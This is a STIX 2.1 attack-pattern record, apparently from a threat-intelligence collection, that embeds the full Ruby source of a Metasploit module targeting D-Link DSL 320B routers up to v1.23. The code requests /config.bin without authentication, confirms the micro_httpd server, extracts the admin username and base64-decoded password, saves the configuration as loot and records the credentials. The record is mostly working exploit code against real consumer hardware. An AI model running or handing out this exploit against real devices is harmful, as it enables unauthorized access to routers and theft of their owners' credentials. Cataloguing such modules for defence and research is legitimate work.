{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--334436bb-f7cd-42c5-8288-9eef1683ce08",
    "created": "2024-08-14T16:23:05.351372Z",
    "modified": "2024-08-14T16:23:05.351377Z",
    "name": "D-Link DSL 320B Password Extractor",
    "description": " This module exploits an authentication bypass vulnerability in D-Link DSL 320B <=v1.23. This vulnerability allows to extract the credentials for the remote management interface.  'References' => [ [ 'EDB', '25252' ] [ 'OSVDB', '93013' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/dlink_dsl320b_password_extractor.rb",
            "external_id": "dlink_dsl320b_password_extractor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'D-Link DSL 320B Password Extractor',\n      'Description' => %q{\n          This module exploits an authentication bypass vulnerability in D-Link DSL 320B\n        <=v1.23. This vulnerability allows to extract the credentials for the remote\n        management interface.\n      },\n      'References' => [\n        [ 'EDB', '25252' ],\n        [ 'OSVDB', '93013' ],\n        [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-018' ]\n      ],\n      'Author' => [\n        'Michael Messner <devnull[at]s3cur1ty.de>'\n      ],\n      'License' => MSF_LICENSE\n    )\n  end\n\n  def run\n    vprint_status(\"#{rhost}:#{rport} - Trying to access the configuration of the device\")\n\n    # download configuration\n    begin\n      res = send_request_cgi({\n        'uri' => '/config.bin',\n        'method' => 'GET'\n      })\n\n      return if res.nil?\n      return if (res.headers['Server'].nil? || res.headers['Server'] !~ (/micro_httpd/))\n      return if (res.code == 404)\n\n      if res.body =~ (/sysPassword value/) || res.body =~ (/sysUserName value/)\n        if res.body !~ /sysPassword value/\n          print_status(\"#{rhost}:#{rport} - Default Configuration of DSL 320B detected - no password section available, try admin/admin\")\n        else\n          print_good(\"#{rhost}:#{rport} - Credentials successfully extracted\")\n        end\n\n        # store all details as loot -> there is some usefull stuff in the response\n        loot = store_loot('dlink.dsl320b.config', 'text/plain', rhost, res.body)\n        print_good(\"#{rhost}:#{rport} - Configuration of DSL 320B downloaded to: #{loot}\")\n\n        user = ''\n        pass = ''\n\n        res.body.each_line do |line|\n          if line =~ %r{<sysUserName\\ value=\"(.*)\"/>}\n            user = ::Regexp.last_match(1)\n            next\n          end\n          next unless line =~ %r{<sysPassword\\ value=\"(.*)\"/>}\n\n          pass = ::Regexp.last_match(1)\n          pass = Rex::Text.decode_base64(pass)\n          print_good(\"#{rhost}:#{rport} - Credentials found: #{user} / #{pass}\")\n\n          connection_details = {\n            module_fullname: fullname,\n            username: user,\n            private_data: pass,\n            private_type: :password,\n            workspace_id: myworkspace_id,\n            proof: line,\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }.merge(service_details)\n          create_credential_and_login(connection_details)\n        end\n      end\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}